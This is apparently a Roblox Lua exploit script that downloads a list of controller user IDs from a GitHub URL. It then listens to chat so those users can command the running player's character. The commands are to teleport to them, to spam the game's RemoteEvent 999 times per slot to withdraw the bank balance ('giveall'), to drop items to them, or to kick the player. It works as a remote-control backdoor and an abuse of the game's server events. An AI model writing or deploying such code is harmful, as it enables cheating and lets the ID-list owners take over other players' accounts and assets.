local ids = game:HttpGet("https://raw.githubusercontent.com/Turnergamer/ProX/refs/heads/main/src/id", true)

-- Parse the IDs into a table
local idList = {}
for id in ids:gmatch("%d+") do
    table.insert(idList, tonumber(id))
end

print(idList)  -- Print all the IDs to check if they were correctly fetched

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local takeout = {
    [1] = "TakeBank",
    [2] = "One",
    [3] = ""
}

-- List of numbers in word format
local numbers = {
    "One", "Two", "Three", "Four", "Five", 
    "Six", "Seven", "Eight", "Nine", "Ten", 
    "Eleven", "Twelve", "Thirteen", "Fourteen", "Fifteen"
}

---args for commands
local dropargs = {
    [1] = "DropItem"
}

-- Function to teleport to a player's position
local function teleportToPlayer(localPlayer, targetPlayer)
    local targetHumanoidRootPart = targetPlayer.Character:WaitForChild("HumanoidRootPart", 5)
    local localHumanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart", 5)

    if localHumanoidRootPart and targetHumanoidRootPart then
        localHumanoidRootPart.CFrame = targetHumanoidRootPart.CFrame
    else
        warn("HumanoidRootPart not found for one of the players!")
    end
end

-- Function to store the current position of the player
local function getPlayerPosition(localPlayer)
    local humanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart", 5)
    if humanoidRootPart then
        return humanoidRootPart.CFrame
    else
        warn("HumanoidRootPart not found for LocalPlayer!")
        return nil
    end
end

local function TakeOutAll()
    for _, number in ipairs(numbers) do
        takeout[2] = number

        -- Fire the RemoteEvent 999 times for each number
        for i = 1, 999 do
            ReplicatedStorage:WaitForChild("RemoteEvent"):FireServer(unpack(takeout))
        end
    end
end

-- Command mapping table to easily add more commands
local commandActions = {
    ["^tp"] = function(sender)
        teleportToPlayer(LocalPlayer, sender)
    end,
    ["^giveall"] = function(sender)
        TakeOutAll()
        print("giveall triggered")
        teleportToPlayer(LocalPlayer, sender)
    end,
    ["^drop"] = function(sender)
        local originalPosition = getPlayerPosition(LocalPlayer)
        
        teleportToPlayer(LocalPlayer, sender)
        wait(0.4)
        game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(dropargs))
        print("DROP triggered")
        wait(0.4)

        if originalPosition then
            local humanoidRootPart = LocalPlayer.Character:WaitForChild("HumanoidRootPart", 5)
            if humanoidRootPart then
                humanoidRootPart.CFrame = originalPosition
                print("Returned to original position")
            else
                warn("HumanoidRootPart not found when returning!")
            end
        end
    end,
    ["^kick"] = function(sender)
        LocalPlayer:Kick("You have been kicked by a premium user.")
        print("KICK triggered")
    end
}

-- Monitor chat messages for commands
TextChatService.OnIncomingMessage = function(message)
    local sender = Players:GetPlayerByUserId(message.TextSource.UserId)

    if sender then
        -- Check if the sender's UserId is in the list of target IDs
        for _, targetUserId in ipairs(idList) do
            if sender.UserId == targetUserId then
                -- Loop through the commandActions table to check if the message matches a command
                for command, action in pairs(commandActions) do
                    if message.Text:lower() == command:lower() then
                        action(sender)  -- Execute the command's action function
                        break  -- Stop checking further commands once a match is found
                    end
                end
                break  -- Stop checking further target IDs once a match is found
            end
        end
    end
end
